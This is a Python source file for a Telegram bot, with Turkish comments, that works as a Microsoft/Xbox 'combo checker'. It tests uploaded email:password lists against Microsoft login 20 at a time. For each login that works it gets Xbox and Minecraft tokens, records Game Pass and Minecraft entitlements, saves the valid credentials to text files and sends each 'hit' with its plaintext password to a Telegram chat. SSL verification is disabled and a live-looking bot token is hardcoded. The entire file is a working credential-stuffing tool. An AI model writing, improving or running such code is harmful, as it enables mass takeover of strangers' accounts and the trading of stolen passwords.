import subprocess
import sys
import requests
import urllib3
import warnings
import re
import time
import os
import asyncio
from datetime import datetime
from urllib.parse import urlparse, parse_qs
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# SSL ve Protokol uyarılarını gizle
urllib3.disable_warnings()
warnings.filterwarnings("ignore")

# Yapılandırma Tanımlamaları
TOKEN = "8586488864:AAETJFeQOk_igst2YE1OWq9QvpM25jTDEq4"
SFTAG_URL = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
MAX_RETRIES = 2
REQUEST_TIMEOUT = 5
MAX_CONCURRENT_TASKS = 20  # Railway CPU/RAM sınırları için optimize edilmiş eşzamanlılık

class Stats:
    def __init__(self):
        self.checked = 0
        self.hits = 0
        self.bad = 0
        self.twofa = 0
        self.errors = 0
        self.xgp = 0
        self.xgpu = 0
        self.other = 0
        self.retries = 0
        self.start_time = time.time()
        self.is_running = False

    def get_cpm(self):
        elapsed = time.time() - self.start_time
        if elapsed > 0:
            return int((self.checked / elapsed) * 60)
        return 0

    def generate_stats_text(self):
        return (
            f"📊 **XBOX CHECKER CANLI DURUM**\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"🔄 **Checked:** {self.checked}\n"
            f"✅ **Hits:** {self.hits}\n"
            f"❌ **Bad:** {self.bad}\n"
            f"🔒 **2FA/Secure:** {self.twofa}\n"
            f"🎮 **XGP Ultimate:** {self.xgpu}\n"
            f"🎮 **Xbox Game Pass:** {self.xgp}\n"
            f"⚙️ **Other:** {self.other}\n"
            f"⚡ **CPM:** {self.get_cpm()}\n"
            f"⚠️ **Errors:** {self.errors}\n"
            f"━━━━━━━━━━━━━━━━━━━━━"
        )

global_stats = Stats()

def create_results_folder():
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    folder = f"results/{timestamp}"
    os.makedirs(folder, exist_ok=True)
    return folder

results_folder = create_results_folder()

def save_hit(filename, content):
    try:
        with open(f"{results_folder}/{filename}", 'a', encoding='utf-8') as f:
            f.write(content + '\n')
    except:
        pass

def get_sftag(session, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            response = session.get(SFTAG_URL, timeout=REQUEST_TIMEOUT)
            text = response.text
            match = re.search(r'value=\\\"(.+?)\\\"', text, re.S) or re.search(r'value="(.+?)"', text, re.S)
            if match:
                sftag = match.group(1)
                match = re.search(r'"urlPost":"(.+?)"', text, re.S) or re.search(r"urlPost:'(.+?)'", text, re.S)
                if match:
                    return match.group(1), sftag
        except Exception:
            if attempt == max_attempts - 1:
                global_stats.errors += 1
        time.sleep(0.3)
    return None, None

def microsoft_auth(session, email, password, url_post, sftag, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sftag}
            login_request = session.post(url_post, data=data, 
                                        headers={'Content-Type': 'application/x-www-form-urlencoded'}, 
                                        allow_redirects=True, timeout=REQUEST_TIMEOUT)
            
            if '#' in login_request.url and login_request.url != SFTAG_URL:
                token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ["None"])[0]
                if token != "None":
                    return token, "success"
            elif 'cancel?mkt=' in login_request.text:
                try:
                    data = {
                        'ipt': re.search('(?<=\"ipt\" value=\").+?(?=\">)', login_request.text).group(),
                        'pprid': re.search('(?<=\"pprid\" value=\").+?(?=\">)', login_request.text).group(),
                        'uaid': re.search('(?<=\"uaid\" value=\").+?(?=\">)', login_request.text).group()
                    }
                    action_url = re.search('(?<=id=\"fmHF\" action=\").+?(?=\" )', login_request.text).group()
                    ret = session.post(action_url, data=data, allow_redirects=True, timeout=REQUEST_TIMEOUT)
                    return_url = re.search('(?<=\"recoveryCancel\":{\"returnUrl\":\").+?(?=\",)', ret.text).group()
                    fin = session.get(return_url, allow_redirects=True, timeout=REQUEST_TIMEOUT)
                    token = parse_qs(urlparse(fin.url).fragment).get('access_token', ["None"])[0]
                    if token != "None":
                        return token, "success"
                except Exception:
                    pass
            elif any(value in login_request.text for value in ["recover?mkt", "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "/Abuse?mkt="]):
                return None, "2fa"
            elif any(value in login_request.text.lower() for value in ["password is incorrect", "account doesn't exist", "sign in to your microsoft account", "tried to sign in too many times"]):
                return None, "bad"  
        except Exception:
            global_stats.retries += 1
            if attempt == max_attempts - 1:
                return None, "error"
        time.sleep(0.3)
    return None, "error"

def get_xbox_token(session, ms_token, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            payload = {
                "Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token},
                "RelyingParty": "http://auth.xboxlive.com",
                "TokenType": "JWT"
            }
            response = session.post('https://user.auth.xboxlive.com/user/authenticate', 
                                   json=payload, 
                                   headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
                                   timeout=REQUEST_TIMEOUT)
            if response.status_code == 200:
                data = response.json()
                xbox_token = data.get('Token')
                if xbox_token:
                    uhs = data['DisplayClaims']['xui'][0]['uhs']
                    return xbox_token, uhs
            elif response.status_code == 429:
                time.sleep(1.5)
                continue
        except Exception:
            global_stats.retries += 1
            if attempt == max_attempts - 1:
                return None, None
        time.sleep(0.3)
    return None, None

def get_xsts_token(session, xbox_token, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            payload = {
                "Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]},
                "RelyingParty": "rp://api.minecraftservices.com/",
                "TokenType": "JWT"
            }
            response = session.post('https://xsts.auth.xboxlive.com/xsts/authorize',
                                   json=payload,
                                   headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
                                   timeout=REQUEST_TIMEOUT)    
            if response.status_code == 200:
                data = response.json()
                return data.get('Token')
            elif response.status_code == 429:
                time.sleep(1.5)
                continue
        except Exception:
            global_stats.retries += 1
            if attempt == max_attempts - 1:
                return None  
        time.sleep(0.3)    
    return None

def get_minecraft_token(session, uhs, xsts_token, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            response = session.post('https://api.minecraftservices.com/authentication/login_with_xbox',
                                   json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"},
                                   headers={'Content-Type': 'application/json'},
                                   timeout=REQUEST_TIMEOUT)          
            if response.status_code == 200:
                return response.json().get('access_token')
            elif response.status_code == 429:
                time.sleep(1.5)
                continue
        except Exception:
            global_stats.retries += 1
            if attempt == max_attempts - 1:
                return None 
        time.sleep(0.3)
    return None

def check_minecraft_entitlements(session, mc_token, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            response = session.get('https://api.minecraftservices.com/entitlements/mcstore',
                                  headers={'Authorization': f'Bearer {mc_token}'},
                                  timeout=REQUEST_TIMEOUT)
            if response.status_code == 200:
                text = response.text
                if 'product_game_pass_ultimate' in text:
                    return 'Xbox Game Pass Ultimate', text
                elif 'product_game_pass_pc' in text:
                    return 'Xbox Game Pass', text
                elif '"product_minecraft"' in text:
                    return 'Minecraft', text
                else:
                    others = []
                    if 'product_minecraft_bedrock' in text:
                        others.append("Bedrock")
                    if 'product_legends' in text:
                        others.append("Legends")
                    if 'product_dungeons' in text:
                        others.append('Dungeons')
                    if others:
                        return 'Other: ' + ', '.join(others), text
                    return None, text
            elif response.status_code == 429:
                time.sleep(1.5)
                continue
            else:
                return None, None
        except Exception:
            global_stats.retries += 1
            if attempt == max_attempts - 1:
                return None, None
        time.sleep(0.3)
    return None, None

def get_minecraft_profile(session, mc_token, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            response = session.get('https://api.minecraftservices.com/minecraft/profile',
                                  headers={'Authorization': f'Bearer {mc_token}'},
                                  timeout=REQUEST_TIMEOUT)
            if response.status_code == 200:
                return response.json()
            elif response.status_code == 429:
                time.sleep(1.5)
                continue
            elif response.status_code == 404:
                return None
        except Exception:
            global_stats.retries += 1
            if attempt == max_attempts - 1:
                return None
        time.sleep(0.3)
    return None

async def check_account(combo, context, chat_id):
    try:
        parts = combo.strip().split(':')
        if len(parts) < 2:
            global_stats.bad += 1
            global_stats.checked += 1
            return
        email = parts[0]
        password = ':'.join(parts[1:])
        session = requests.Session()
        session.verify = False
        url_post, sftag = get_sftag(session)
        if not url_post or not sftag:
            global_stats.errors += 1
            global_stats.checked += 1
            return
            
        ms_token, auth_status = microsoft_auth(session, email, password, url_post, sftag)
        
        if auth_status == "2fa":
            global_stats.twofa += 1
            global_stats.checked += 1
            save_hit("2FA.txt", f"{email}:{password}")
            return 
        elif auth_status == "bad":
            global_stats.bad += 1
            global_stats.checked += 1
            return
        elif auth_status != "success" or not ms_token:
            global_stats.errors += 1
            global_stats.checked += 1
            return 
            
        xbox_token, uhs = get_xbox_token(session, ms_token)
        if not xbox_token or not uhs:
            global_stats.errors += 1
            global_stats.checked += 1
            return
            
        xsts_token = get_xsts_token(session, xbox_token)
        if not xsts_token:
            global_stats.errors += 1
            global_stats.checked += 1
            return
            
        mc_token = get_minecraft_token(session, uhs, xsts_token)
        if not mc_token:
            global_stats.errors += 1
            global_stats.checked += 1
            return
            
        account_type, entitlements = check_minecraft_entitlements(session, mc_token) 
        if not account_type:
            save_hit("Not_Found.txt", f"{email}:{password} | No Minecraft entitlements")
            global_stats.bad += 1
            global_stats.checked += 1
            return  
            
        profile = get_minecraft_profile(session, mc_token)     
        if profile:
            name = profile.get('name', 'N/A')
            uuid = profile.get('id', 'N/A')
            capes = ", ".join([cape["alias"] for cape in profile.get("capes", [])])
            if not capes:
                capes = "None"
        else:
            name = "Not Set"
            uuid = "N/A"
            capes = "N/A"  
        
        capture_text = f"Email: {email}\nPassword: {password}\nName: {name}\nUUID: {uuid}\nCapes: {capes}\nAccount Type: {account_type}\n{'='*50}\n"
        
        save_hit("Hits.txt", f"{email}:{password}")
        save_hit("Capture.txt", capture_text)

        if 'Ultimate' in account_type:
            global_stats.xgpu += 1
            save_hit("XboxGamePassUltimate.txt", f"{email}:{password}")
        elif 'Game Pass' in account_type:
            global_stats.xgp += 1
            save_hit("XboxGamePass.txt", f"{email}:{password}")
        elif 'Other' in account_type:
            global_stats.other += 1
            save_hit("Other.txt", f"{email}:{password} | {account_type}")
            
        global_stats.hits += 1
        global_stats.checked += 1
        
        hit_text = (
            f"🔥 **HİT HESAP BULUNDU**\n"
            f"📧 **Combo:** `{email}:{password}`\n"
            f"👤 **Name:** {name}\n"
            f"🆔 **UUID:** {uuid}\n"
            f"🧥 **Capes:** {capes}\n"
            f"🎮 **Tür:** {account_type}"
        )
        await context.bot.send_message(chat_id=chat_id, text=hit_text)
        
    except Exception:
        global_stats.errors += 1
        global_stats.checked += 1

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("👋 Xbox Checker Bot Aktif.\nTaramayı başlatmak için bir `.txt` combo dosyası gönderin.")

async def handle_docs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.message.chat_id
    document = update.message.document
    
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Sadece .txt uzantılı combo dosyası yükleyin.")
        return

    if global_stats.is_running:
        await update.message.reply_text("⚠️ Şu an çalışan bir işlem var. Lütfen bitmesini bekleyin.")
        return

    await update.message.reply_text("📥 Dosya başarıyla indiriliyor...")
    file = await context.bot.get_file(document.file_id)
    await file.download_to_drive("temp_combos.txt")

    with open("temp_combos.txt", "r", encoding="utf-8", errors="ignore") as f:
        combos = [line.strip() for line in f if line.strip() and ':' in line]

    if os.path.exists("temp_combos.txt"):
        os.remove("temp_combos.txt")
    
    if not combos:
        await update.message.reply_text("❌ Geçerli bir combo formatı bulunamadı.")
        return

    global_stats.__init__()
    global_stats.is_running = True
    status_message = await update.message.reply_text("🚀 Çoklu işlem başlatılıyor...")

    async def run_checker():
        semaphore = asyncio.Semaphore(MAX_CONCURRENT_TASKS)
        
        async def worker(combo):
            async with semaphore:
                # Eşzamanlı istekleri asenkron havuzda koştur
                await check_account(combo, context, chat_id)

        tasks = [asyncio.create_task(worker(combo)) for combo in combos]
        
        # Sürekli arayüz güncelleme döngüsü
        while not all(t.done() for t in tasks):
            await asyncio.sleep(5)
            try:
                await context.bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=status_message.message_id,
                    text=global_stats.generate_stats_text()
                )
            except Exception:
                pass

        global_stats.is_running = False
        try:
            await context.bot.edit_message_text(
                chat_id=chat_id,
                message_id=status_message.message_id,
                text=global_stats.generate_stats_text() + "\n\n🏁 **Tarama Tamamlandı!**"
            )
        except Exception:
            await context.bot.send_message(chat_id=chat_id, text="🏁 Tarama başarıyla tamamlandı!")

    asyncio.create_task(run_checker())

def main():
    # v20+ modern Application mimarisi
    application = Application.builder().token(TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(MessageHandler(filters.Document.FileExtension("txt"), handle_docs))

    print("Bot modern asenkron yapıda çalışıyor...")
    application.run_polling()

if __name__ == "__main__":
    main()

